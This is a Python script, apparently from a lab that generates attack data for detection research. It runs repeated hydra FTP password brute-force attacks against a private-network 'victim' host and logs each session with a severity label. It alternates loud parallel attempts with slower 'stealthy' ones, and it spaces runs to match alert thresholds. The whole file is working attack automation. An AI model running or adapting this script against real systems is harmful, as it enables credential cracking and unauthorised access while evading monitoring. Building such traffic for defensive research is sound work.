#!/usr/bin/env python3
"""
Brute-force attack script - Phase 1, Category 2.
Runs hydra FTP brute-force attempts against the victim, varying intensity/timing.
Logs each session via attack_logger.py - resilient to timeouts/interrupts.
"""
import subprocess
import time
import sys
from attack_logger import log_attack_session, now_utc

TARGET_IP = "10.0.9.216"
SOURCE_IP = "10.0.16.175"
CLOUD = "aws"
WORDLIST = "/home/ubuntu/wordlist.txt"
USERNAME = "testuser"
MAX_ATTACK_SECONDS = 90

def run_bruteforce(session_num, attack_type, hydra_args, severity):
    session_id = f"bruteforce_{CLOUD}_{session_num:03d}"
    command = f"hydra {hydra_args} -l {USERNAME} -P {WORDLIST} ftp://{TARGET_IP}"

    start_ts = now_utc()
    print(f"[{session_id}] Starting: {command}")

    outcome_note = attack_type
    try:
        full_command = f"timeout {MAX_ATTACK_SECONDS} {command}"
        result = subprocess.run(
            full_command.split(),
            capture_output=True,
            text=True,
            timeout=MAX_ATTACK_SECONDS + 5
        )
        if "successfully completed" in result.stdout:
            outcome_note = f"{attack_type}_cracked"
        else:
            outcome_note = f"{attack_type}_failed"
    except subprocess.TimeoutExpired:
        print(f"[{session_id}] TIMED OUT after {MAX_ATTACK_SECONDS}s")
        outcome_note = f"{attack_type}_timed_out"
    except Exception as e:
        print(f"[{session_id}] ERROR: {e}")
        outcome_note = f"{attack_type}_error"
    finally:
        end_ts = now_utc()
        log_attack_session(
            session_id=session_id,
            attack_category="bruteforce",
            tool="hydra",
            command=command,
            start_ts=start_ts,
            end_ts=end_ts,
            source_ip=SOURCE_IP,
            target_ip=TARGET_IP,
            cloud=CLOUD,
            target_port=21,
            intended_severity=severity,
            notes=outcome_note
        )
        print(f"[{session_id}] Logged. Duration: {(end_ts - start_ts).total_seconds():.2f}s")

if __name__ == "__main__":
    num_sessions = int(sys.argv[1]) if len(sys.argv) > 1 else 5

    for i in range(1, num_sessions + 1):
        if i % 3 == 0:
            # Stealthy: single task, slower attempts
            run_bruteforce(i, "stealthy_bruteforce", "-t 1 -W 3", "stealthy")
        else:
            # Loud: default parallel tasks (fast)
            run_bruteforce(i, "loud_bruteforce", "-t 4", "loud")
        time.sleep(65)  # gap > 60s so we get fresh alerts each session, given yesterday's threshold discovery

